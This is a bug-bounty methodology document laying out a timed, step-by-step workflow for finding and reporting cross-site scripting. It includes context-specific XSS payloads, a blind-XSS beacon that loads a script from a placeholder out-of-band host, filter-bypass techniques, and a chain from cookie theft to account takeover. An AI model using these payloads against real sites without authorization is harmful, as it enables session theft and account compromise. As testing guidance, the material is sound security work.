# Workflow 06 — Hunt XSS

Run this on any app that renders user input. Time box: 90 minutes. Remember: the
goal is a chain to impact, not a popup.

---

## Step 1 — Find the sinks (15 min)

Collect input points that are later rendered:

- Search, profile, comments, tickets, support messages.
- Filenames, upload names, titles.
- Error messages echoing input.
- URL fragment / query read by JS.

Collect render points: search results, profile pages, admin panels, emails/PDFs.

The best target: **input you control that renders in an admin/support panel.**

---

## Step 2 — Marker test (10 min)

Submit a unique marker:

```
xssBBH<random>
```

Find where it appears in the raw response (not the rendered page). Note the
context: HTML body, attribute, script string, URL.

---

## Step 3 — Context payload (20 min)

Per context:

```html
<!-- body -->
<svg onload=alert(1)>
<!-- double-quoted attribute -->
" onmouseover=alert(1) x="
<!-- single-quoted attribute -->
' onmouseover=alert(1) x='
<!-- script string -->
</script><svg onload=alert(1)>
<!-- href -->
javascript:alert(1)
```

If encoded (`&lt;`), the context is safe — try a different context. Do not
report an encoded reflection.

---

## Step 4 — Stored specific (20 min)

1. Submit in a field that persists.
2. Open the page that renders it (as another role if possible).
3. If it fires for you but not others → stored but scoped.
4. If it fires for an admin/agent → HIGH path.

Use a beacon instead of `alert` for blind/admin:

```html
"><script src=https://<oast>/x.js></script>
```

---

## Step 5 — DOM XSS (15 min)

Read the JS for `innerHTML`, `eval`, `location.hash` → sink. Test:

```
https://target/page#<img src=x onerror=alert(1)>
```

Fragments bypass WAFs. A DOM XSS via hash is often the easiest win.

---

## Step 6 — Bypass filters (10 min)

- Case, alternate tags, no parentheses, no spaces.
- HTML entities, URL encoding, double encoding.
- Split across params.
- Mutation XSS where a sanitizer re-parses.

A payload blocked by the WAF is not a finding.

---

## Step 7 — Chain to impact (15 min)

If XSS fires, check:

- Cookie `HttpOnly`? If absent, `document.cookie` is yours.
- CSP? `unsafe-inline` / wildcard = payload runs.
- Session rotated on login? Stolen cookie survives.
- Can the payload call change-email/change-password?

All bad → ATO (High). Otherwise → Medium stored/refl.

---

## Step 8 — Report

Capture the request, the rendered response with the payload executing
(screenshot of alert or beacon hit), and the chain if any. Run
`checklists/xss.md`.

---

## Definition of done

- [ ] Sinks and render points listed.
- [ ] Marker traced to raw response.
- [ ] Context payload tested.
- [ ] Stored tested on a privileged view if reachable.
- [ ] DOM XSS tested via fragment.
- [ ] CSP/HttpOnly/session checked for chain.
- [ ] Evidence captured.

Encoded everywhere + strict CSP + HttpOnly = closed. Write it and move.
